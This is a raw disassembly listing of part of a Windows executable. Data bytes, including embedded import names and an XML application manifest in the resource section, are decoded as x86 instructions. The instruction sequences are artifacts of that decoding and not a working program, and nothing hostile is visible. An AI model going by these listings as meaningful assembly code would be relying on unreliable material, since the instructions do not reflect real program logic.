  40c732:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  40c73a:	jo     0x40c79b
  40c73c:	pop    edi
  40c73d:	ins    WORD PTR es:[edi],dx
  40c73f:	outs   dx,DWORD PTR ds:[esi]
  40c740:	fs add BYTE PTR gs:[eax],al
  40c744:	in     al,0x0
  40c746:	pop    edi
  40c747:	pop    edi
  40c748:	jae    0x40c7af
  40c74a:	je     0x40c7c1
  40c74c:	jae    0x40c7b3
  40c74e:	jb     0x40c7bd
  40c750:	popa   
  40c751:	je     0x40c7bb
  40c753:	gs jb  0x40c7c8
  40c756:	add    BYTE PTR [eax],al
  40c758:	call   0x6eaa265e
  40c75d:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x6d006d72
  40c765:	jae    0x40c7dd
  40c767:	arpl   WORD PTR [edx+0x74],si
  40c76a:	cs fs ins BYTE PTR es:[edi],dx
  40c76d:	ins    BYTE PTR es:[edi],dx
  40c76e:	add    BYTE PTR [eax],al
  40c770:	xor    eax,0x65743f00
  40c775:	jb     0x40c7e4
  40c777:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  40c77e:	pop    ecx
  40c77f:	inc    ecx
  40c780:	pop    eax
  40c781:	pop    eax
  40c782:	pop    edx
  40c783:	add    BYTE PTR [edi],dh
  40c785:	add    DWORD PTR [edi+0x63],ebx
  40c788:	outs   dx,DWORD PTR ds:[esi]
  40c789:	outs   dx,BYTE PTR ds:[esi]
  40c78a:	je     0x40c7fe
  40c78c:	outs   dx,DWORD PTR ds:[esi]
  40c78d:	ins    BYTE PTR es:[edi],dx
  40c78e:	data16 jo 0x40c791
  40c791:	add    BYTE PTR [edx+0x1],ch
  40c794:	pop    edi
  40c795:	gs js  0x40c7fb
  40c798:	gs jo  0x40c80f
  40c79b:	pop    edi
  40c79c:	push   0x6c646e61
  40c7a1:	gs jb  0x40c7d8
  40c7a4:	pop    edi
  40c7a5:	arpl   WORD PTR [edi+0x6d],bp
  40c7a8:	ins    DWORD PTR es:[edi],dx
  40c7a9:	outs   dx,DWORD PTR ds:[esi]
  40c7aa:	outs   dx,BYTE PTR ds:[esi]
  40c7ab:	add    BYTE PTR [eax+0x6c745203],ch
  40c7b1:	inc    esi
  40c7b2:	jb     0x40c819
  40c7b4:	gs dec eax
  40c7b6:	gs popa 
  40c7b8:	jo     0x40c7ba
  40c7ba:	fadd   QWORD PTR [ecx]
  40c7bc:	dec    esi
  40c7bd:	je     0x40c810
  40c7bf:	jne    0x40c826
  40c7c1:	jb     0x40c83c
  40c7c3:	push   esi
  40c7c4:	outs   dx,DWORD PTR ds:[esi]
  40c7c5:	ins    BYTE PTR es:[edi],dx
  40c7c6:	jne    0x40c835
  40c7c8:	gs dec ecx
  40c7ca:	outs   dx,BYTE PTR ds:[esi]
  40c7cb:	outs   dx,WORD PTR ds:[esi]
  40c7cd:	jb     0x40c83c
  40c7cf:	popa   
  40c7d0:	je     0x40c83b
  40c7d2:	outs   dx,DWORD PTR ds:[esi]
  40c7d3:	outs   dx,BYTE PTR ds:[esi]
  40c7d4:	inc    esi
  40c7d5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4e022500
  40c7dd:	je     0x40c832
  40c7df:	gs je  0x40c82b
  40c7e2:	outs   dx,BYTE PTR ds:[esi]
  40c7e3:	outs   dx,WORD PTR ds:[esi]
  40c7e5:	jb     0x40c854
  40c7e7:	popa   
  40c7e8:	je     0x40c853
  40c7ea:	outs   dx,DWORD PTR ds:[esi]
  40c7eb:	outs   dx,BYTE PTR ds:[esi]
  40c7ec:	push   esp
  40c7ed:	push   0x64616572
  40c7f2:	add    BYTE PTR [eax],al
  40c7f4:	loope  0x40c7f8
  40c7f6:	push   edx
  40c7f7:	je     0x40c865
  40c7f9:	inc    ebx
  40c7fa:	outs   dx,DWORD PTR ds:[esi]
  40c7fb:	ins    DWORD PTR es:[edi],dx
  40c7fc:	jo     0x40c870
  40c7fe:	gs jae 0x40c874
  40c801:	inc    edx
  40c802:	jne    0x40c86a
  40c804:	data16 gs jb 0x40c808
  40c808:	mov    BYTE PTR [edx+edx*2],al
  40c80b:	je     0x40c879
  40c80d:	dec    esi
  40c80e:	je     0x40c863
  40c810:	je     0x40c873
  40c812:	je     0x40c889
  40c814:	jae    0x40c86a
  40c816:	outs   dx,DWORD PTR ds:[esi]
  40c817:	inc    esp
  40c818:	outs   dx,DWORD PTR ds:[esi]
  40c819:	jae    0x40c860
  40c81b:	jb     0x40c88f
  40c81d:	outs   dx,DWORD PTR ds:[esi]
  40c81e:	jb     0x40c820
  40c820:	test   eax,0x6c745202
  40c825:	inc    ecx
  40c826:	ins    BYTE PTR es:[edi],dx
  40c827:	ins    BYTE PTR es:[edi],dx
  40c828:	outs   dx,DWORD PTR ds:[esi]
  40c829:	arpl   WORD PTR [ecx+0x74],sp
  40c82c:	gs dec eax
  40c82e:	gs popa 
  40c830:	jo     0x40c832
  40c832:	enter  0x5204,0x74
  40c836:	ins    BYTE PTR es:[edi],dx
  40c837:	push   edx
  40c838:	popa   
  40c839:	outs   dx,BYTE PTR ds:[esi]
  40c83a:	outs   dx,DWORD PTR fs:[esi]
  40c83c:	ins    DWORD PTR es:[edi],dx
  40c83d:	add    BYTE PTR [ebx],ch
  40c83f:	add    edx,DWORD PTR [edx+0x74]
  40c842:	ins    BYTE PTR es:[edi],dx
  40c843:	inc    esp
  40c844:	arpl   WORD PTR gs:[edi+0x6d],bp
  40c848:	jo     0x40c8bc
  40c84a:	gs jae 0x40c8c0
  40c84d:	inc    edx
  40c84e:	jne    0x40c8b6
  40c850:	data16 gs jb 0x40c899
  40c854:	js     0x40c856
  40c856:	mov    bh,0x3
  40c858:	push   edx
  40c859:	je     0x40c8c7
  40c85b:	inc    edi
  40c85c:	gs je  0x40c8a2
  40c85f:	outs   dx,DWORD PTR ds:[esi]
  40c860:	ins    DWORD PTR es:[edi],dx
  40c861:	jo     0x40c8d5
  40c863:	gs jae 0x40c8d9
  40c866:	imul   ebp,DWORD PTR [edi+0x6e],0x6b726f57
  40c86d:	push   ebx
  40c86e:	jo     0x40c8d1
  40c870:	arpl   WORD PTR [ebp+0x53],sp
  40c873:	imul   edi,DWORD PTR [edx+0x65],0x2820000
  40c87a:	push   edx
  40c87b:	je     0x40c8e9
  40c87d:	inc    ecx
  40c87e:	arpl   WORD PTR [ecx+0x75],si
  40c881:	imul   esi,DWORD PTR [edx+0x65],0x76697250
  40c888:	imul   ebp,DWORD PTR [ebp+eiz*2+0x67],0x746e0065
  40c890:	fs ins BYTE PTR es:[edi],dx
  40c892:	ins    BYTE PTR es:[edi],dx
  40c893:	cs fs ins BYTE PTR es:[edi],dx
  40c896:	ins    BYTE PTR es:[edi],dx
  40c897:	add    BYTE PTR [eax],bl
  40c899:	add    cl,BYTE PTR [edi+0x70]
  40c89c:	outs   dx,BYTE PTR gs:[esi]
  40c89e:	push   esp
  40c89f:	push   0x64616572
  40c8a4:	push   esp
  40c8a5:	outs   dx,DWORD PTR ds:[esi]
  40c8a6:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40c8aa:	mov    DWORD PTR [ecx],eax
  40c8ac:	dec    ecx
  40c8ad:	ins    DWORD PTR es:[edi],dx
  40c8ae:	jo     0x40c915
  40c8b0:	jb     0x40c925
  40c8b2:	outs   dx,DWORD PTR ds:[esi]
  40c8b3:	outs   dx,BYTE PTR ds:[esi]
  40c8b4:	popa   
  40c8b5:	je     0x40c91c
  40c8b7:	dec    esp
  40c8b8:	outs   dx,DWORD PTR ds:[esi]
  40c8b9:	addr16 addr16 gs fs dec edi
  40c8be:	outs   dx,BYTE PTR ds:[esi]
  40c8bf:	push   ebp
  40c8c0:	jae    0x40c927
  40c8c2:	jb     0x40c8c4
  40c8c4:	mov    ecx,0x76655202
  40c8c9:	gs jb  0x40c940
  40c8cc:	push   esp
  40c8cd:	outs   dx,DWORD PTR ds:[esi]
  40c8ce:	push   ebx
  40c8cf:	gs ins BYTE PTR es:[edi],dx
  40c8d1:	data16 add BYTE PTR [eax],al
  40c8d4:	pop    edi
  40c8d5:	add    eax,0x65656c53
  40c8da:	jo     0x40c8dc
  40c8dc:	pop    DWORD PTR ds:0x61686e55
  40c8e2:	outs   dx,BYTE PTR ds:[esi]
  40c8e3:	fs ins BYTE PTR es:[edi],dx
  40c8e5:	gs fs inc ebp
  40c8e8:	js     0x40c94d
  40c8ea:	gs jo  0x40c961
  40c8ed:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40c8f4:	gs jb  0x40c8f7
  40c8f7:	add    BYTE PTR [eax+0x5],dl
  40c8fa:	push   ebx
  40c8fb:	gs je  0x40c953
  40c8fe:	outs   dx,BYTE PTR ds:[esi]
  40c8ff:	push   0x6c646e61
  40c904:	gs fs inc ebp
  40c907:	js     0x40c96c
  40c909:	gs jo  0x40c980
  40c90c:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40c913:	gs jb  0x40c916
  40c916:	or     al,BYTE PTR [edx]
  40c918:	inc    edi
  40c919:	gs je  0x40c95f
  40c91c:	jne    0x40c990
  40c91e:	jb     0x40c985
  40c920:	outs   dx,BYTE PTR ds:[esi]
  40c921:	je     0x40c973
  40c923:	jb     0x40c994
  40c925:	arpl   WORD PTR [ebp+0x73],sp
  40c928:	jae    0x40c92a
  40c92a:	outs   dx,BYTE PTR ds:[esi]
  40c92b:	add    eax,0x6d726554
  40c930:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  40c937:	outs   dx,DWORD PTR ds:[esi]
  40c938:	arpl   WORD PTR [ebp+0x73],sp
  40c93b:	jae    0x40c93d
  40c93d:	add    BYTE PTR [ebp+0x2],ah
  40c940:	inc    edi
  40c941:	gs je  0x40c991
  40c944:	outs   dx,DWORD PTR ds:[esi]
  40c945:	fs jne 0x40c9b4
  40c948:	gs dec eax
  40c94a:	popa   
  40c94b:	outs   dx,BYTE PTR ds:[esi]
  40c94c:	fs ins BYTE PTR es:[edi],dx
  40c94e:	gs inc ecx
  40c950:	add    BYTE PTR [eax],al
  40c952:	xor    eax,DWORD PTR [ecx+edx*2]
  40c955:	jne    0x40c9bc
  40c957:	jb     0x40c9d2
  40c959:	push   eax
  40c95a:	gs jb  0x40c9c3
  40c95d:	outs   dx,DWORD PTR ds:[esi]
  40c95e:	jb     0x40c9cd
  40c960:	popa   
  40c961:	outs   dx,BYTE PTR ds:[esi]
  40c962:	arpl   WORD PTR [ebp+0x43],sp
  40c965:	outs   dx,DWORD PTR ds:[esi]
  40c966:	jne    0x40c9d6
  40c968:	je     0x40c9cf
  40c96a:	jb     0x40c96c
  40c96c:	or     eax,DWORD PTR [edx]
  40c96e:	inc    edi
  40c96f:	gs je  0x40c9b5
  40c972:	jne    0x40c9e6
  40c974:	jb     0x40c9db
  40c976:	outs   dx,BYTE PTR ds:[esi]
  40c977:	je     0x40c9c9
  40c979:	jb     0x40c9ea
  40c97b:	arpl   WORD PTR [ebp+0x73],sp
  40c97e:	jae    0x40c9c9
  40c980:	add    BYTE PTR fs:[edi],cl
  40c983:	add    al,BYTE PTR [edi+0x65]
  40c986:	je     0x40c9cb
  40c988:	jne    0x40c9fc
  40c98a:	jb     0x40c9f1
  40c98c:	outs   dx,BYTE PTR ds:[esi]
  40c98d:	je     0x40c9e3
  40c98f:	push   0x64616572
  40c994:	dec    ecx
  40c995:	add    BYTE PTR fs:[eax],al
  40c998:	fld    DWORD PTR [edx]
  40c99a:	inc    edi
  40c99b:	gs je  0x40c9f1
  40c99e:	jns    0x40ca13
  40c9a0:	je     0x40ca07
  40c9a2:	ins    DWORD PTR es:[edi],dx
  40c9a3:	push   esp
  40c9a4:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  40c9ab:	ins    BYTE PTR es:[edi],dx
  40c9ac:	gs push esp
  40c9ae:	imul   ebp,DWORD PTR [ebp+0x65],0x4702f600
  40c9b5:	gs je  0x40ca0c
  40c9b8:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  40c9bf:	je     0x40c9c1
  40c9c1:	add    BYTE PTR [esi+0x32334b03],cl
  40c9c7:	inc    edi
  40c9c8:	gs je  0x40ca1b
  40c9cb:	gs jb  0x40ca34
  40c9ce:	outs   dx,DWORD PTR ds:[esi]
  40c9cf:	jb     0x40ca3e
  40c9d1:	popa   
  40c9d2:	outs   dx,BYTE PTR ds:[esi]
  40c9d3:	arpl   WORD PTR [ebp+0x49],sp
  40c9d6:	outs   dx,BYTE PTR ds:[esi]
  40c9d7:	outs   dx,WORD PTR ds:[esi]
  40c9d9:	add    BYTE PTR [ebp+0x2],dh
  40c9dc:	inc    edi
  40c9dd:	gs je  0x40ca2e
  40c9e0:	popa   
  40c9e1:	je     0x40ca4c
  40c9e3:	jbe    0x40ca4a
  40c9e5:	push   ebx
  40c9e6:	jns    0x40ca5b
  40c9e8:	je     0x40ca4f
  40c9ea:	ins    DWORD PTR es:[edi],dx
  40c9eb:	dec    ecx
  40c9ec:	outs   dx,BYTE PTR ds:[esi]
  40c9ed:	outs   dx,WORD PTR ds:[esi]
  40c9ef:	add    BYTE PTR [eax],ah
  40c9f1:	add    al,BYTE PTR [edi+0x65]
  40c9f4:	je     0x40ca3a
  40c9f6:	jb     0x40ca61
  40c9f8:	jbe    0x40ca5f
  40c9fa:	push   esp
  40c9fb:	jns    0x40ca6d
  40c9fd:	gs push edi
  40c9ff:	add    BYTE PTR [esi+0x65724601],bl
  40ca05:	gs dec esp
  40ca07:	imul   esp,DWORD PTR [edx+0x72],0x797261
  40ca0e:	mov    ecx,0x69615705
  40ca13:	je     0x40ca5b
  40ca15:	outs   dx,DWORD PTR ds:[esi]
  40ca16:	jb     0x40ca6b
  40ca18:	imul   ebp,DWORD PTR [esi+0x67],0x624f656c
  40ca1f:	push   0x65
  40ca21:	arpl   WORD PTR [eax+eax*1-0x6],si
  40ca25:	add    al,0x53
  40ca27:	gs je  0x40ca6f
  40ca2a:	jbe    0x40ca91
  40ca2c:	outs   dx,BYTE PTR ds:[esi]
  40ca2d:	je     0x40ca2f
  40ca2f:	add    BYTE PTR [esi],cl
  40ca31:	add    al,BYTE PTR [edi+0x65]
  40ca34:	je     0x40ca79
  40ca36:	jne    0x40caaa
  40ca38:	jb     0x40ca9f
  40ca3a:	outs   dx,BYTE PTR ds:[esi]
  40ca3b:	je     0x40ca91
  40ca3d:	push   0x64616572
  40ca42:	add    BYTE PTR [eax],al
  40ca44:	lods   al,BYTE PTR ds:[esi]
  40ca45:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  40ca49:	fs dec esp
  40ca4b:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  40ca52:	add    BYTE PTR [eax],al
  40ca54:	or     DWORD PTR [ebx],eax
  40ca56:	inc    edi
  40ca57:	gs je  0x40cab0
  40ca5a:	gs jb  0x40cad0
  40ca5d:	imul   ebp,DWORD PTR [edi+0x6e],0x577845
  40ca64:	sahf   
  40ca65:	add    al,BYTE PTR [edi+0x65]
  40ca68:	je     0x40caba
  40ca6a:	jb     0x40cadb
  40ca6c:	arpl   WORD PTR [ecx+0x64],ax
  40ca6f:	fs jb  0x40cad7
  40ca72:	jae    0x40cae7
  40ca74:	add    BYTE PTR [eax],al
  40ca76:	mov    ah,0x0
  40ca78:	inc    ebx
  40ca79:	jb     0x40cae0
  40ca7b:	popa   
  40ca7c:	je     0x40cae3
  40ca7e:	inc    ebp
  40ca7f:	jbe    0x40cae6
  40ca81:	outs   dx,BYTE PTR ds:[esi]
  40ca82:	je     0x40cadb
  40ca84:	add    BYTE PTR [eax],al
  40ca86:	xor    al,0x4
  40ca88:	push   ecx
  40ca89:	jne    0x40caf0
  40ca8b:	jb     0x40cb06
  40ca8d:	push   eax
  40ca8e:	gs jb  0x40caf7
  40ca91:	outs   dx,DWORD PTR ds:[esi]
  40ca92:	jb     0x40cb01
  40ca94:	popa   
  40ca95:	outs   dx,BYTE PTR ds:[esi]
  40ca96:	arpl   WORD PTR [ebp+0x46],sp
  40ca99:	jb     0x40cb00
  40ca9b:	jno    0x40cb12
  40ca9d:	outs   dx,BYTE PTR gs:[esi]
  40ca9f:	arpl   WORD PTR [ecx+0x0],di
  40caa2:	mov    dh,0x3
  40caa4:	dec    esp
  40caa5:	outs   dx,DWORD PTR ds:[esi]
  40caa6:	arpl   WORD PTR [ecx+0x6c],sp
  40caa9:	inc    esi
  40caaa:	jb     0x40cb11
  40caac:	gs add bh,ah
  40caaf:	add    BYTE PTR [ebx+0x72],al
  40cab2:	gs popa 
  40cab4:	je     0x40cb1b
  40cab6:	push   esp
  40cab7:	push   0x64616572
  40cabc:	add    BYTE PTR [eax],al
  40cabe:	xor    eax,DWORD PTR [ebx]
  40cac0:	dec    eax
  40cac1:	gs popa 
  40cac3:	jo     0x40cb06
  40cac5:	ins    BYTE PTR es:[edi],dx
  40cac6:	ins    BYTE PTR es:[edi],dx
  40cac7:	outs   dx,DWORD PTR ds:[esi]
  40cac8:	arpl   WORD PTR [eax],ax
  40caca:	aaa    
  40cacb:	add    ecx,DWORD PTR [eax+0x65]
  40cace:	popa   
  40cacf:	jo     0x40cb17
  40cad1:	jb     0x40cb38
  40cad3:	add    BYTE PTR gs:[eax],al
  40cad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cad7:	add    al,BYTE PTR [edi+0x65]
  40cada:	je     0x40cb2c
  40cadc:	jb     0x40cb4d
  40cade:	arpl   WORD PTR [ebp+0x73],sp
  40cae1:	jae    0x40cb2b
  40cae3:	gs popa 
  40cae5:	jo     0x40cae7
  40cae7:	add    BYTE PTR [edx],dl
  40cae9:	add    eax,0x6e697270
  40caee:	je     0x40cb56
  40caf0:	add    BYTE PTR [eax],al
  40caf2:	or     DWORD PTR ds:0x636d656d,eax
  40caf8:	jo     0x40cb73
  40cafa:	add    BYTE PTR [eax],al
  40cafc:	or     eax,0x6d656d05
  40cb01:	jae    0x40cb68
  40cb03:	je     0x40cb05
	...

Disassembly of section .rsrc:

0040d000 <.rsrc>:
	...
  40d00c:	add    DWORD PTR [eax],eax
  40d00e:	add    al,BYTE PTR [eax]
  40d010:	call   0x28c0d015
  40d015:	add    BYTE PTR [eax],al
  40d017:	adc    BYTE PTR [eax],0x0
  40d01a:	add    BYTE PTR [eax],al
  40d01c:	inc    eax
  40d01d:	add    BYTE PTR [eax],al
  40d01f:	sbb    BYTE PTR [eax],0x0
  40d022:	add    BYTE PTR [eax],al
  40d024:	pop    eax
  40d025:	add    BYTE PTR [eax],al
  40d027:	add    BYTE PTR [eax],0x0
	...
  40d036:	add    DWORD PTR [eax],eax
  40d038:	add    DWORD PTR [eax],eax
  40d03a:	add    BYTE PTR [eax],al
  40d03c:	jo     0x40d03e
  40d03e:	add    BYTE PTR [eax+0x0],al
	...
  40d04c:	add    BYTE PTR [eax],al
  40d04e:	add    DWORD PTR [eax],eax
  40d050:	add    DWORD PTR [eax],eax
  40d052:	add    BYTE PTR [eax],al
  40d054:	mov    BYTE PTR [eax],al
  40d056:	add    BYTE PTR [eax+0x0],al
	...
  40d064:	add    BYTE PTR [eax],al
  40d066:	add    DWORD PTR [eax],eax
  40d068:	add    DWORD PTR [eax],eax
  40d06a:	add    BYTE PTR [eax],al
  40d06c:	mov    al,ds:0x800000
	...
  40d07d:	add    BYTE PTR [ecx],al
  40d07f:	add    BYTE PTR [ecx],cl
  40d081:	add    al,0x0
  40d083:	add    BYTE PTR [eax+0x0],bh
	...
  40d095:	add    BYTE PTR [ecx],al
  40d097:	add    BYTE PTR [ecx],cl
  40d099:	add    al,0x0
  40d09b:	add    al,cl
	...
  40d0ad:	add    BYTE PTR [ecx],al
  40d0af:	add    BYTE PTR [ecx],cl
  40d0b1:	add    al,0x0
  40d0b3:	add    al,bl
  40d0b5:	add    BYTE PTR [eax],al
  40d0b7:	add    BYTE PTR [eax],ah
  40d0b9:	xlat   BYTE PTR ds:[ebx]
  40d0ba:	add    BYTE PTR [eax],al
  40d0bc:	enter  0x0,0x0
	...
  40d0c8:	cwde   
  40d0c9:	rol    DWORD PTR [eax],cl
  40d0cb:	add    BYTE PTR [eax+0x3],cl
  40d0d1:	add    BYTE PTR [eax],al
  40d0d3:	add    BYTE PTR [eax],al
  40d0d5:	add    BYTE PTR [eax],al
  40d0d7:	add    al,dh
  40d0d9:	rol    BYTE PTR [eax],1
  40d0db:	add    BYTE PTR [edi+0x2],ah
  40d0e1:	add    BYTE PTR [eax],al
  40d0e3:	add    BYTE PTR [eax],al
  40d0e5:	add    BYTE PTR [eax],al
  40d0e7:	add    BYTE PTR [ebx],al
  40d0e9:	add    BYTE PTR [ebp+0x0],cl
  40d0ec:	push   ebp
  40d0ed:	add    BYTE PTR [ecx+0x0],cl
  40d0f0:	cmp    al,0x3f
  40d0f2:	js     0x40d161
  40d0f4:	ins    BYTE PTR es:[edi],dx
  40d0f5:	and    BYTE PTR [esi+0x65],dh
  40d0f8:	jb     0x40d16d
  40d0fa:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40d101:	xor    BYTE PTR [edx],ah
  40d103:	and    BYTE PTR [ebp+0x6e],ah
  40d106:	arpl   WORD PTR [edi+0x64],bp
  40d109:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  40d110:	inc    esi
  40d111:	sub    eax,0x73202238
  40d116:	je     0x40d179
  40d118:	outs   dx,BYTE PTR ds:[esi]
  40d119:	fs popa 
  40d11b:	ins    BYTE PTR es:[edi],dx
  40d11c:	outs   dx,DWORD PTR ds:[esi]
  40d11d:	outs   dx,BYTE PTR ds:[esi]
  40d11e:	gs cmp eax,0x73657922
  40d124:	and    bh,BYTE PTR [edi]
  40d126:	ds or  eax,0x2d213c0a
  40d12c:	sub    eax,0x706f4320
  40d131:	jns    0x40d1a5
  40d133:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40d13a:	sub    DWORD PTR [eax],esp
  40d13c:	dec    ebp
  40d13d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40d144:	je     0x40d166
  40d146:	inc    ebx
  40d147:	outs   dx,DWORD PTR ds:[esi]
  40d148:	jb     0x40d1ba
  40d14a:	outs   dx,DWORD PTR ds:[esi]
  40d14b:	jb     0x40d1ae
  40d14d:	je     0x40d1b8
  40d14f:	outs   dx,DWORD PTR ds:[esi]
  40d150:	outs   dx,BYTE PTR ds:[esi]
  40d151:	and    BYTE PTR ds:0xa0d3e2d,ch
  40d157:	cmp    al,0x61
  40d159:	jae    0x40d1ce
  40d15b:	gs ins DWORD PTR es:[edi],dx
  40d15d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40d161:	js     0x40d1d0
  40d163:	ins    BYTE PTR es:[edi],dx
  40d164:	outs   dx,BYTE PTR ds:[esi]
  40d165:	jae    0x40d1a4
  40d167:	and    dh,BYTE PTR [ebp+0x72]
  40d16a:	outs   dx,BYTE PTR ds:[esi]
  40d16b:	cmp    dh,BYTE PTR [ebx+0x63]
  40d16e:	push   0x73616d65
  40d173:	sub    eax,0x7263696d
  40d178:	outs   dx,DWORD PTR ds:[esi]
  40d179:	jae    0x40d1ea
  40d17b:	data16 je 0x40d1ab
  40d17e:	arpl   WORD PTR [edi+0x6d],bp
  40d181:	cmp    ah,BYTE PTR [ecx+0x73]
  40d184:	ins    DWORD PTR es:[edi],dx
  40d185:	cs jbe 0x40d1b9
  40d188:	and    ah,BYTE PTR [eax]
  40d18a:	ins    DWORD PTR es:[edi],dx
  40d18b:	popa   
  40d18c:	outs   dx,BYTE PTR ds:[esi]
  40d18d:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40d194:	jb     0x40d209
  40d196:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40d19d:	xor    BYTE PTR [edx],ah
  40d19f:	ds or  eax,0x73613c0a
  40d1a5:	jae    0x40d20c
  40d1a7:	ins    DWORD PTR es:[edi],dx
  40d1a8:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40d1ac:	fs outs dx,BYTE PTR gs:[esi]
  40d1af:	je     0x40d21a
  40d1b1:	je     0x40d22c
  40d1b3:	or     eax,0x2020200a
  40d1b8:	and    BYTE PTR [esi+0x65],dh
  40d1bb:	jb     0x40d230
  40d1bd:	imul   ebp,DWORD PTR [edi+0x6e],0x2e35223d
  40d1c4:	xor    DWORD PTR [esi],ebp
  40d1c6:	xor    BYTE PTR [esi],ch
  40d1c8:	xor    BYTE PTR [edx],ah
  40d1ca:	or     eax,0x2020200a
  40d1cf:	and    BYTE PTR [eax+0x72],dh
  40d1d2:	outs   dx,DWORD PTR ds:[esi]
  40d1d3:	arpl   WORD PTR [ebp+0x73],sp
  40d1d6:	jae    0x40d247
  40d1d8:	jb     0x40d21b
  40d1da:	jb     0x40d23f
  40d1dc:	push   0x63657469
  40d1e1:	je     0x40d258
  40d1e3:	jb     0x40d24a
  40d1e5:	cmp    eax,0x36387822
  40d1ea:	and    cl,BYTE PTR ds:0x2020200a
  40d1f0:	and    BYTE PTR [esi+0x61],ch
  40d1f3:	ins    DWORD PTR es:[edi],dx
  40d1f4:	gs cmp eax,0x63694d22
  40d1fa:	jb     0x40d26b
  40d1fc:	jae    0x40d26d
  40d1fe:	data16 je 0x40d22f
  40d201:	push   edi
  40d202:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  40d209:	inc    esi
  40d20a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x65747379
  40d212:	ins    DWORD PTR es:[edi],dx
  40d213:	cs inc ebx
  40d215:	outs   dx,DWORD PTR ds:[esi]
  40d216:	ins    DWORD PTR es:[edi],dx
  40d217:	jo     0x40d27a
  40d219:	arpl   WORD PTR [edx+eiz*1+0xd],si
  40d21d:	or     ah,BYTE PTR [eax]
  40d21f:	and    BYTE PTR [eax],ah
  40d221:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40d225:	gs cmp eax,0x6e697722
  40d22b:	xor    esi,DWORD PTR [edx]
  40d22d:	and    cl,BYTE PTR ds:0xd3e2f0a
  40d233:	or     bh,BYTE PTR [esp+eiz*2]
  40d236:	gs jae 0x40d29c
  40d239:	jb     0x40d2a4
  40d23b:	jo     0x40d2b1
  40d23d:	imul   ebp,DWORD PTR [edi+0x6e],0x6c69463e
  40d244:	and    BYTE PTR gs:[ecx+0x6e],cl
  40d248:	je     0x40d2af
  40d24a:	addr16 jb 0x40d2b6
  40d24d:	je     0x40d2c8
  40d24f:	and    BYTE PTR [ebp+0x74],dl
  40d252:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x642f3c79
  40d25a:	gs jae 0x40d2c0
  40d25d:	jb     0x40d2c8
  40d25f:	jo     0x40d2d5
  40d261:	imul   ebp,DWORD PTR [edi+0x6e],0xd0a0d3e
  40d268:	or     bh,BYTE PTR [esp+esi*2]
  40d26b:	jb     0x40d2e2
  40d26d:	jae    0x40d2e3
  40d26f:	dec    ecx
  40d270:	outs   dx,BYTE PTR ds:[esi]
  40d271:	outs   dx,WORD PTR ds:[esi]
  40d273:	and    BYTE PTR [eax+0x6d],bh
  40d276:	ins    BYTE PTR es:[edi],dx
  40d277:	outs   dx,BYTE PTR ds:[esi]
  40d278:	jae    0x40d2b7
  40d27a:	and    dh,BYTE PTR [ebp+0x72]
  40d27d:	outs   dx,BYTE PTR ds:[esi]
  40d27e:	cmp    dh,BYTE PTR [ebx+0x63]
  40d281:	push   0x73616d65
  40d286:	sub    eax,0x7263696d
  40d28b:	outs   dx,DWORD PTR ds:[esi]
  40d28c:	jae    0x40d2fd
  40d28e:	data16 je 0x40d2be
  40d291:	arpl   WORD PTR [edi+0x6d],bp
  40d294:	cmp    ah,BYTE PTR [ecx+0x73]
  40d297:	ins    DWORD PTR es:[edi],dx
  40d298:	cs jbe 0x40d2ce
  40d29b:	and    bh,BYTE PTR [esi]
  40d29d:	or     eax,0x2020200a
  40d2a2:	and    BYTE PTR [ebx+esi*2],bh
  40d2a5:	arpl   WORD PTR gs:[ebp+0x72],si
  40d2a9:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40d2b1:	and    BYTE PTR [eax],ah
  40d2b3:	and    BYTE PTR [eax],ah
  40d2b5:	and    BYTE PTR [eax],ah
  40d2b7:	cmp    al,0x72
  40d2b9:	gs jno 0x40d331
  40d2bc:	gs jae 0x40d333
  40d2bf:	gs fs push eax
  40d2c2:	jb     0x40d32d
  40d2c4:	jbe    0x40d32f
  40d2c6:	ins    BYTE PTR es:[edi],dx
  40d2c7:	gs addr16 gs jae 0x40d30a
  40d2cc:	or     eax,0x2020200a
  40d2d1:	and    BYTE PTR [eax],ah
  40d2d3:	and    BYTE PTR [eax],ah
  40d2d5:	and    BYTE PTR [eax],ah
  40d2d7:	and    BYTE PTR [eax],ah
  40d2d9:	and    BYTE PTR [edx+esi*2],bh
  40d2dc:	gs jno 0x40d354
  40d2df:	gs jae 0x40d356
  40d2e2:	gs fs inc ebp
  40d2e5:	js     0x40d34c
  40d2e7:	arpl   WORD PTR [ebp+0x74],si
  40d2ea:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40d2f1:	ins    BYTE PTR es:[edi],dx
  40d2f2:	or     eax,0x2020200a
  40d2f7:	and    BYTE PTR [eax],ah
  40d2f9:	and    BYTE PTR [eax],ah
  40d2fb:	and    BYTE PTR [eax],ah
  40d2fd:	and    BYTE PTR [eax],ah
  40d2ff:	and    BYTE PTR [eax],ah
  40d301:	and    BYTE PTR [eax],ah
  40d303:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40d307:	gs ins BYTE PTR es:[edi],dx
  40d309:	cmp    eax,0x49736122
  40d30e:	outs   dx,BYTE PTR ds:[esi]
  40d30f:	jbe    0x40d380
